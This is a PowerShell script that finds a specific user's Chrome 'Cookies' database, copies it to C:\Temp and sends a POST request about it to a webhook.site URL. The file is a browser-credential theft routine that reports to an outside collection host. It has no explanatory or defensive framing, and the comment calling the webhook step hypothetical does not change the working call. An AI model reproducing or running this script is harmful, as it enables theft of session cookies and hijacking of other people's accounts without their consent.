# Define the target directory
$targetDirectory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data"

# Define the file name to search for
$fileName = "Cookies"

# Navigate to the target directory
Set-Location -Path $targetDirectory

# Search for the file
$file = Get-ChildItem -Recurse | Where-Object { $_.Name -eq $fileName }

# Check if the file was found
if ($file -ne $null) {
    # Define the destination path for the file copy to C:\Temp
    $destinationDirectory = "C:\Temp"
    $destinationPath = Join-Path -Path $destinationDirectory -ChildPath $fileName
    
    # Check if the destination directory exists, create it if it doesn't
    if (-not (Test-Path -Path $destinationDirectory)) {
        New-Item -ItemType Directory -Path $destinationDirectory
    }

    # Copy the file to the destination
    Copy-Item -Path $file.FullName -Destination $destinationPath

    # Preparing data for sending to a webhook (hypothetically)
    $uri = "https://webhook.site/e133adb0-4321-413a-aff1-7e0495c990cc"
    $body = @{
        FileName = $fileName
        FilePath = $destinationPath
    } | ConvertTo-Json

    # Send data to the webhook server
    Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
} else {
    Write-Output "File $fileName not found."
}
